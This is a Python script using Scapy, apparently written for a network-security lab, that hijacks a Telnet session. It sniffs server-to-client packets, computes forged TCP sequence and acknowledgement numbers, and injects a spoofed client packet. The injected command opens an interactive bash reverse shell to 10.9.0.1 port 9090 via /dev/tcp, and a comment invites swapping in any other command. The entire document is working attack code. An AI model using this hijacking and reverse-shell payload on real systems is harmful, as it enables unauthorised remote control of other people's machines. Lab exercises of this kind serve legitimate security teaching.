#!/usr/bin/env python3
from scapy.all import *

INTERFACE = 'br-a8d4018e5d3c'     
SERVER_IP = '10.9.0.5'            
TELNET_PORT = 23                 

def spoof_pkt(pkt):
   
    # 只处理 server → client 的包（确认 seq/ack 用）
    if pkt[IP].src != SERVER_IP or pkt[TCP].sport != TELNET_PORT:
        return

    print("\n[嗅探到服务端包，准备构造注入包]")

    # --- 提取关键字段 ---
    server_seq = pkt[TCP].seq
    server_ack = pkt[TCP].ack
    data_len = len(pkt[TCP].payload)

    print(f"server_seq = {server_seq}")
    print(f"server_ack = {server_ack}")
    print(f"data_len   = {data_len}")

    # ---------------------------------------------------
    # 计算伪造包的 seq/ack（核心逻辑）
    # ---------------------------------------------------
    # 伪造包 = client → server
    forged_seq = server_ack               # client 下一次要发的 seq
    forged_ack = server_seq + data_len    # client 应该回的 ack

    print(f"forged_seq = {forged_seq}")
    print(f"forged_ack = {forged_ack}")

    # ---------------------------------------------------
    # 构造伪造包（发送命令）
    # ---------------------------------------------------
    ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)

    tcp = TCP(
        sport=pkt[TCP].dport,      # client 的 port（伪装）
        dport=TELNET_PORT,         # telnet server
        flags="A",                 # ACK + 数据
        seq=forged_seq,
        ack=forged_ack
    )

    # 要注入的命令（你随便改）
    cmd = "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1\n\0"

    forged_pkt = ip / tcp / cmd

    print("[发送注入命令...]")
    send(forged_pkt, verbose=0)

    print("[完成] 已向服务器注入命令！")
    print("-------------------------------------------\n")

    # 自动攻击一次后退出（防止刷屏）
    exit(0)


# ---------------------------------------------------
# 嗅探 server → client 的 Telnet 包
# ---------------------------------------------------
filter_str = f"tcp and src host {SERVER_IP} and src port {TELNET_PORT}"

print("[开始嗅探] 等待服务器的 Telnet 包...")
print(f"iface:  {INTERFACE}")
print(f"filter: {filter_str}")

sniff(iface=INTERFACE, filter=filter_str, prn=spoof_pkt)